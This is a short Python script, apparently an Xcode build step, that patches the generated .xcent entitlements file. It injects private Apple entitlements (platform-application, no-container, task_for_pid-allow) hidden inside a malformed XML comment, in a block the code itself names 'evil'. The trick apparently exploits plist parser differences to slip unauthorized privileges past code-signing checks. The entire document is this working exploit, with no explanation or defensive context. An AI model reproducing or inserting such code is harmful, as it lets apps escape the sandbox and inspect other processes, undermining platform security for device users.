import os
# preinstalled python is python2
filename = '/'.join(map(os.environ.get, ('TARGET_TEMP_DIR', 'FULL_PRODUCT_NAME'))) + '.xcent'
print("patch file named " + filename)

evil = '''
    <!---><!-->
    <key>platform-application</key>
    <true/>
    <key>com.apple.private.security.no-container</key>
    <true/>
    <key>task_for_pid-allow</key>
    <true/>
    <!-- -->
'''
with open(filename, 'r') as fp:
  buf = fp.read()
cursor = buf.rfind('</dict>')
output = buf[0:cursor] + evil + buf[cursor:]
with open(filename, 'w') as fp:
  fp.write(output)
